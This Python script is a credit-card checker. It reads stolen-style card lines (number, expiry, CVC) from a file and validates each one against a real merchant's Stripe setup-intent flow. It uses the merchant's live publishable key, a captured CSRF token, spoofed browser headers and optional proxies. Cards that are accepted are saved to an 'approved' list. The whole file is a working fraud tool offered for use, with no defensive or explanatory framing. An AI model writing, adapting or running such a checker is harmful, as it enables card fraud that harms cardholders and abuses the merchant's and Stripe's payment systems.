import requests
import urllib.parse
import os

def read_cc_file(filename):
    cards = []
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if line:
                    parts = line.split('|')
                    if len(parts) == 4:
                        cards.append({
                            'number': parts[0],
                            'exp_month': parts[1],
                            'exp_year': parts[2],
                            'cvc': parts[3]
                        })
                    else:
                        print(f"Invalid format in line: {line}")
        return cards
    except FileNotFoundError:
        print(f"Error: File {filename} not found.")
        return []
 

def save_approved_card(card_details):
    try:
        with open('approved.txt', 'a', encoding='utf-8') as file:
            card_string = f"{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']} Status: Approved\n"
            file.write(card_string)
    
    except Exception as e:
        print(f"Error saving approved card: {e}")

def get_setup_intent(proxy=None):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.iwallet.com',
        'priority': 'u=1, i',
        'referer': 'https://app.iwallet.com/p/a0a64c61-7dc1-4327-aca7-9ee129c156ae',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-storage-access': 'none',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'x-csrf-token': 'qRPfCTzybNTiSLD/g8QYLxnRemoO/+LxZCWK8NpeGJ5Dti7pf+t6XuffupYXqN85ZLj+ovYC4qK7CpoeHTivLA==',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'publishable_key': 'pk_live_51MwBcwDCtaB4BgMhyT98pBR4RtrmSdfZVimwd2E9V8B93kC0oneA7FbHBqse16wYfkJG3djUYxbt3eIJNNc0G31700pS4uowuV',
        'usage': 'off_session',
        'payment_method_types': ['card'],
    }
    
    proxies = None
    if proxy:
        proxies = {"http": proxy, "https": proxy}

    try:
        print("Getting setup intent...")
        response = requests.post(
            'https://app.iwallet.com/api/v1/public/setup_intents', 
            headers=headers, 
            json=json_data,
            proxies=proxies,
            timeout=30
        )
        
      
        
        if response.status_code == 201:
            data = response.json()
            setup_intent_id = data.get('id')
            client_secret = data.get('client_secret')
           
            return setup_intent_id, client_secret
        elif response.status_code == 429:
            print(f"Rate limited, wait a bit")
            return None, None
        else:
            print(f"Failed: {response.status_code}")
            return None, None
            
    except Exception as e:
        print(f"Error: {e}")
        return None, None

def create_payment_method(card_details, proxy=None):
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-GB,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }

    data = {
        'type': 'card',
        'billing_details[address][postal_code]': '11001',
        'card[number]': card_details['number'],
        'card[cvc]': card_details['cvc'],
        'card[exp_month]': card_details['exp_month'],
        'card[exp_year]': card_details['exp_year'],
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/2016dc44bd; stripe-js-v3/2016dc44bd; split-card-element',
        'referrer': 'https://app.iwallet.com',
        'time_on_page': '634923',
        'client_attribution_metadata[client_session_id]': '4035a95d-2285-405d-84c5-c923a874b575',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
        'client_attribution_metadata[merchant_integration_version]': '2017',
        'key': 'pk_live_51MwBcwDCtaB4BgMhyT98pBR4RtrmSdfZVimwd2E9V8B93kC0oneA7FbHBqse16wYfkJG3djUYxbt3eIJNNc0G31700pS4uowuV'
    }
    
    proxies = None
    if proxy:
        proxies = {"http": proxy, "https": proxy}

    try:
        print(f"Creating payment method for card ending in {card_details['number'][-4:]}...")
        encoded_payload = urllib.parse.urlencode(data)
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods', 
            headers=headers, 
            data=encoded_payload,
            proxies=proxies,
            timeout=30
        )
        
        if response.status_code == 200:
            response_data = response.json()
            payment_method_id = response_data.get('id')
            return payment_method_id, response_data
        elif response.status_code == 429:
            print(f"Rate limited")
            return None, None
        else:
            print(f"Failed: {response.status_code}")
            return None, None
            
    except Exception as e:
        print(f"Error creating payment method: {e}")
        return None, None

def confirm_setup_intent(setup_intent_id, client_secret, payment_method_id, payment_method_data, card_details, proxy=None):
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-GB,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }

    data = {
        'payment_method': payment_method_id,
        'key': 'pk_live_51MwBcwDCtaB4BgMhyT98pBR4RtrmSdfZVimwd2E9V8B93kC0oneA7FbHBqse16wYfkJG3djUYxbt3eIJNNc0G31700pS4uowuV',
        'client_attribution_metadata[client_session_id]': '4035a95d-2285-405d-84c5-c923a874b575',
        'client_attribution_metadata[merchant_integration_source]': 'l1',
        'client_secret': client_secret
    }
    
    proxies = None
    if proxy:
        proxies = {"http": proxy, "https": proxy}

    try:
        print(f"Confirming setup intent for card ending in {card_details['number'][-4:]}...")
        encoded_payload = urllib.parse.urlencode(data)
        url = f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm'
        
        response = requests.post(
            url,
            headers=headers,
            data=encoded_payload,
            proxies=proxies,
            timeout=30
        )
        
        if response.status_code == 429:
            print(f"Rate limited")
            return False, {"error": {"message": "Rate limited"}}
        elif response.status_code == 200:
            response_data = response.json()
            status = response_data.get('status')
            
            card = payment_method_data.get('card', {})
            country = card.get('country')
            display_brand = card.get('display_brand')
            brand = card.get('brand')
            funding = card.get('funding')
            
            print(f"Success! Brand: {display_brand or brand}, Country: {country}, Type: {funding}")
            save_approved_card(card_details)
            return True, response_data
        else:
            response_data = response.json()
            error_info = response_data.get('error', {})
            error_code = error_info.get('code')
            decline_code = error_info.get('decline_code')
            message = error_info.get('message')
            
            payment_method = error_info.get('payment_method', {})
            pm_id = payment_method.get('id')
            card = payment_method.get('card', {})
            country = card.get('country')
            display_brand = card.get('display_brand')
            brand = card.get('brand')
            funding = card.get('funding')
            
            print(f"Failed - Code: {error_code}, Decline: {decline_code}, Msg: {message}")
            if pm_id:
                print(f"PM ID: {pm_id}, Brand: {display_brand or brand}, Country: {country}")
            
            return False, response_data
            
    except Exception as e:
        print(f"Error: {e}")
        return False, str(e)

def check_card(card_details):
    print(f"\n{'='*50}")
    print(f"Checking card: {card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}")
    print(f"{'='*50}")
    
    setup_intent_id, client_secret = get_setup_intent()
    if not setup_intent_id:
        return False
    
    payment_method_id, payment_method_data = create_payment_method(card_details)
    if not payment_method_id:
        return False
    
    success, result = confirm_setup_intent(
        setup_intent_id, 
        client_secret, 
        payment_method_id,
        payment_method_data,
        card_details
    )
    
    if success:
        print("Success!")
        return True
    else:
        print("Failed")
        return False

if __name__ == "__main__":
    if os.path.exists('approved.txt'):
        os.remove('approved.txt')
    
    cards = read_cc_file('cc.txt')
    
    if not cards:
        print("No cards found")
    else:
        print(f"Found {len(cards)} cards")
        approved_count = 0
        for i, card in enumerate(cards, 1):
            print(f"\nCard {i}/{len(cards)}")
            if check_card(card):
                approved_count += 1
        
        print(f"\n{'='*50}")
        print(f"Done: {approved_count}/{len(cards)} approved")
        print(f"{'='*50}")